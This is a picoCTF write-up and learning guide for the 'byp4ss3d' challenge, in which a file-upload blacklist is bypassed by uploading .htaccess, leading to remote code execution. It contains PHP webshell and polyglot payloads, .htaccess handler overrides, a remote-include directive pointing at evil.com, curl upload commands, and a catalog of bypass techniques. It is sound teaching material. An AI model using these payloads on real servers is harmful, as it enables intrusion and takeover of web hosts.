# 🔐 File Upload Bypass to RCE — Learning Guide

> **From the picoCTF challenge "byp4ss3d"**
> `picoCTF{s3rv3r_byp4ss_4961368b}`

---

## 📋 Table of Contents
1. [Challenge Summary](#-challenge-summary)
2. [Recon & Information Gathering](#-recon--information-gathering)
3. [Understanding the Filter](#-understanding-the-filter)
4. [The Bypass — .htaccess Attack](#-the-bypass--htaccess-attack)
5. [General Methodology for File Upload CTFs](#-general-methodology-for-file-upload-ctfs)
6. [File Upload Bypass Techniques Catalog](#-file-upload-bypass-techniques-catalog)
7. [Apache .htaccess Tricks](#-apache-htaccess-tricks)
8. [Key Takeaways](#-key-takeaways)
9. [Further Resources](#-further-resources)

---

## 🚩 Challenge Summary

| Property | Value |
|---|---|
| **Platform** | picoCTF |
| **Category** | Web Exploitation |
| **Web Server** | Apache/2.4.62 (Debian) |
| **Language** | PHP/8.3.22 |
| **Upload Dir** | `images/` |
| **Vulnerability** | Weak extension blacklist → .htaccess upload → RCE |
| **Skill Level** | Beginner / Intermediate |

**Scenario:** A student ID registration portal asks users to upload an image file (JPG, PNG, GIF). The goal is to bypass the file upload filter and achieve Remote Code Execution to read the flag.

---

## 🔍 Recon & Information Gathering

**Every CTF starts with information gathering.** Here's what we did and what you should always do:

### Step 1: Inspect HTTP Response Headers
```bash
curl -s -v http://target/
```
**What we learned:**
- `Server: Apache/2.4.62 (Debian)` → Apache is in play → **.htaccess attacks are possible**
- `X-Powered-By: PHP/8.3.22` → PHP backend → **PHP shells are our payload target**

> 💡 **Always check response headers first.** They tell you what tech stack you're dealing with and narrow your attack surface.

### Step 2: Map the Application
- Found `/upload.php` — handles file uploads
- Found `/images/` — upload destination (403 Forbidden on directory listing, but files are accessible)
- Found `/.htaccess` returns 403 → Apache is processing `.htaccess` files

### Step 3: Test the Upload
- Uploaded a valid PNG → success, file saved to `images/test.png`
- Uploaded `.php` → "Not allowed!" → **extension blacklist confirmed**
- Uploaded `.php.png` → success → **only last extension is checked**
- Uploaded `.phtml` → blocked
- Uploaded `.phar` → success (but won't execute without handler config)
- Uploaded `.htaccess` → success → **THE KEY BYPASS**

---

## 🔬 Understanding the Filter

Here's the actual server-side code from `upload.php`:

```php
<?php
if (isset($_FILES['image'])) {
    $filename = $_FILES['image']['name'];
    $tmp = $_FILES['image']['tmp_name'];

    // Safer way to get file extension
    $parts = explode('.', $filename);
    $ext = strtolower(end($parts));

    $blacklist = array("php", "php3", "phtml", "php4", "zip", "txt");

    if (in_array($ext, $blacklist)) {
        echo "Not allowed!";
        exit(0);
    }

    $destination = "images/" . basename($filename);
    if (move_uploaded_file($tmp, $destination)) {
        echo "Successfully uploaded!<br>";
        echo "Access it at: <a href='$destination'>$destination</a>";
    }
}
?>
```

### What the filter DOES:
- Extracts the **last** segment after splitting by `.` using `end(explode(...))`
- Lowercases it
- Checks against a hardcoded blacklist array

### What the filter DOES NOT do:
| Missing Check | Exploit Opportunity |
|---|---|
| No MIME-type validation | You can send any Content-Type |
| No magic byte / file header check | PHP code passes as "image/png" |
| No file content scanning | `<?php system(...)` passes through |
| Only checks **last** extension | Double extensions (`.php.png`) bypass it |
| `.htaccess` not blacklisted | `htaccess` isn't in the array |
| No filename sanitization | `.htaccess` keeps its leading dot |

### 🧠 Mental Model: Blacklist vs. Whitelist

```
BLACKLIST (what this challenge uses):
  "Block these specific bad things"
  ↓
  Inevitably misses something (e.g., .htaccess, .pht, .php5, .shtml, .php.png)

WHITELIST (what secure apps use):
  "Only allow these specific good things"
  ↓
  Much harder to bypass (but still possible with parser confusion)
```

> 🔑 **Golden rule:** When you see a blacklist, immediately ask *"What did they forget to block?"*

---

## 🎯 The Bypass — .htaccess Attack

### Why .htaccess?

Apache reads `.htaccess` files placed in directories and applies the directives to that directory and its subdirectories. This is a **server-level configuration override** — extremely powerful.

### The Attack in Two Steps

```
┌─────────────────────────────────────────────────┐
│  STEP 1: Upload .htaccess                       │
│                                                 │
│  Content: AddType application/x-httpd-php .png │
│                                                 │
│  filename ".htaccess" has no extension to check │
│  explode('.', '.htaccess') = ['', 'htaccess']   │
│  end() = 'htaccess' → NOT in blacklist ✓        │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│  STEP 2: Upload payload.png                     │
│                                                 │
│  Content: <?php system($_GET['cmd']); ?>        │
│  Extension .png → NOT in blacklist ✓            │
│  Apache now serves it as PHP (via .htaccess)    │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│  STEP 3: Access the shell                       │
│                                                 │
│  GET /images/payload.png?cmd=id                 │
│  → uid=33(www-data) gid=33(www-data)            │
│  → RCE achieved! 🔥                             │
└─────────────────────────────────────────────────┘
```

### Why `AddType` Works Here

```
AddType application/x-httpd-php .png
```

This tells Apache: *"When you serve any file ending in `.png`, hand it to the PHP interpreter first."*

The PHP interpreter finds `<?php ... ?>` tags in the file and executes them. The rest of the file (if any) is output as-is.

---

## 🧪 General Methodology for File Upload CTFs

Follow this checklist every time you face a file upload challenge:

### Phase 1: Recon
```
[ ] What's the web server? (Apache, Nginx, IIS, etc.)
[ ] What server-side language? (PHP, ASP, Python, Node, etc.)
[ ] Where do uploaded files go? (check response, try common paths)
[ ] Can you access uploaded files directly?
[ ] Is directory listing enabled?
```

### Phase 2: Baseline Test
```
[ ] Upload a legitimate file (real PNG/JPG)
[ ] Note the response — does it reveal the path?
[ ] Can you access the uploaded file?
```

### Phase 3: Filter Probing
```
[ ] Try .php → blocked? → Extension filter confirmed
[ ] Try .php.png → works? → Only last extension checked
[ ] Try .PhP → works? → Case-sensitive check (or not)
[ ] Try .phtml, .pht, .php5, .php7, .phar, .shtml → map the blacklist
[ ] Try .htaccess → works? → Apache configuration attack possible
[ ] Try with different Content-Type headers → MIME check?
[ ] Try adding GIF/PNG magic bytes → content check?
[ ] Try null byte: shell.php%00.png → null byte injection?
```

### Phase 4: Exploit
```
[ ] If .htaccess upload works → override handler → upload PHP as image
[ ] If only extension check → try double extension or unknown extensions
[ ] If MIME check only → spoof Content-Type
[ ] If content check → polyglot files (valid image + PHP code)
[ ] If all else fails → look for LFI/include chain
```

---

## 🧰 File Upload Bypass Techniques Catalog

### 1. Extension-Based Bypasses

| Technique | Example | When It Works |
|---|---|---|
| **Double extension** | `shell.php.png` | Only last extension checked |
| **Reverse double** | `shell.png.php` | Apache `AddHandler` parses right-to-left |
| **Less common PHP extensions** | `.pht`, `.phtml`, `.php5`, `.php7`, `.phar`, `.phps`, `.shtml` | Blacklist is incomplete |
| **Case variation** | `shell.pHp`, `shell.PHP` | Case-sensitive filter (rare on Linux) |
| **Trailing dot** | `shell.php.` | Windows strips trailing dot |
| **Null byte (legacy)** | `shell.php%00.png` | PHP < 5.3 (patched) |
| **Multiple dots** | `shell.php.....` | Confuses `end(explode())` |

### 2. Content-Type Bypasses

```python
# If only MIME type is checked, spoof it:
files = {"image": ("shell.php", php_code, "image/png")}
```

Common allowed MIME types:
- `image/png`
- `image/jpeg`
- `image/gif`

### 3. Magic Byte Bypasses (Polyglots)

If the server checks file headers:

```php
// GIF89a header + PHP code = valid GIF + webshell
GIF89a<?php system($_GET['cmd']); ?>
```

```python
# PNG polyglot — embed PHP in a valid PNG
# PNG header (8 bytes) + PHP code in a tEXt/iTXt chunk
```

### 4. Server Configuration Attacks

| Server | Configuration File | Purpose |
|---|---|---|
| **Apache** | `.htaccess` | Per-directory config override |
| **IIS** | `web.config` | IIS configuration |
| **Nginx** | *(no per-dir config)* | Usually need existing misconfig |
| **PHP built-in** | `.user.ini` | PHP per-directory ini (PHP-FPM) |

### 5. Apache .htaccess Directive Catalog

```apache
# Make .png files execute as PHP
AddType application/x-httpd-php .png

# Alternative: use AddHandler
AddHandler application/x-httpd-php .png

# Make .png files parse as PHP using SetHandler
<FilesMatch "\.png$">
    SetHandler application/x-httpd-php
</FilesMatch>

# Execute arbitrary files via php_value + auto_prepend_file
php_value auto_prepend_file /etc/passwd

# Include a remote file
php_value auto_prepend_file http://evil.com/shell.txt

# Override disable_functions to use dangerous functions
php_value disable_functions ""

# Enable allow_url_include for RFI
php_value allow_url_include 1
```

### 6. PHP .user.ini Tricks (PHP-FPM / CGI)

```ini
; Works like .htaccess for PHP per-directory settings
auto_prepend_file=shell.png
```

---

## 🔑 Apache .htaccess Tricks — Deep Dive

The `.htaccess` attack is one of the most powerful file upload bypasses when Apache is involved. Here's why:

### How Apache Processes .htaccess

```
Request: GET /images/payload.png
              ↓
    1. Apache reads /images/.htaccess
    2. Applies directives to this directory
    3. .htaccess says: "png = PHP"
    4. Apache hands payload.png to mod_php
    5. PHP executes <?php ... ?> tags
    6. Result returned to client
```

### Common .htaccess Filename Bypasses

Filters often try to block `.htaccess` by checking for the exact string:

```php
// Common but incomplete checks:
if ($filename == ".htaccess") { block(); }
if (strpos($filename, ".htaccess") !== false) { block(); }
```

Bypasses:
- The server stores it as `.htaccess` regardless of what you send (Apache normalizes)
- If extension check only: `htaccess` (from `.htaccess`) passes blacklist

### What to Test

```bash
# Does .htaccess upload work?
curl -F "image=@htaccess;filename=.htaccess" http://target/upload.php

# Does it take effect? Upload test.png before/after .htaccess
curl -F "image=@shell.php;filename=test.png;type=image/png" http://target/upload.php

# Can you access .htaccess? (should be 403 - that's good!)
curl -I http://target/images/.htaccess
# 403 = Apache protects it from being read, but still processes it ✓
```

---

## 📌 Key Takeaways

### For This Challenge:
1. **Always check the Server header** — if it's Apache, `.htaccess` is on the table
2. **Probe the blacklist systematically** — try many extensions to find gaps
3. **`.htaccess` has no real extension** — `end(explode('.', '.htaccess'))` = `htaccess`

### For File Upload CTFs in General:
1. **Recon is everything** — headers, error messages, file paths, directory listings
2. **Blacklists are always incomplete** — find the gap
3. **Apache = .htaccess opportunity** — always test it
4. **Chain attacks** — file upload is rarely the final step; it enables RCE, LFI, SSRF, etc.
5. **Think about what executes, not what uploads** — even if you can upload `.php`, will it execute?

### For CTF Improvement:
1. **Maintain a checklist** for file upload challenges (like the one above)
2. **Build a payload library** — keep .htaccess, polyglots, and webshells ready
3. **Practice detection** — read source code and spot the missing checks
4. **Learn server configs** — understand Apache, Nginx, IIS behavior

---

## 📚 Further Resources

### Practice Challenges (picoCTF & similar):
- **"byp4ss3d"** — this challenge (Apache .htaccess bypass)
- **"Trickster"** — picoCTF 2024 (PNG polyglot)
- **"Web Gauntlet"** — picoCTF (SQL injection + filter bypass)
- **HackTheBox / TryHackMe** — numerous file upload rooms

### Key Concepts to Study:
- Apache `mod_php` vs PHP-FPM execution models
- PHP `move_uploaded_file()` and `basename()` behavior
- MIME type sniffing vs Content-Type headers
- PHP configuration directives: `disable_functions`, `open_basedir`, `allow_url_include`
- Nginx file upload pitfalls (no `.htaccess`, different parsing)

### Tools to Add to Your Arsenal:
- **Burp Suite** — intercept and modify upload requests
- **ffuf / gobuster** — discover upload directories
- **exiftool** — embed PHP in image EXIF data
- **Python `requests`** — scriptable upload testing

---

> 🏁 **Remember:** The difference between getting stuck and solving a file upload challenge is usually one missed check. Be systematic. Test everything. The filter always has a gap — your job is to find it.
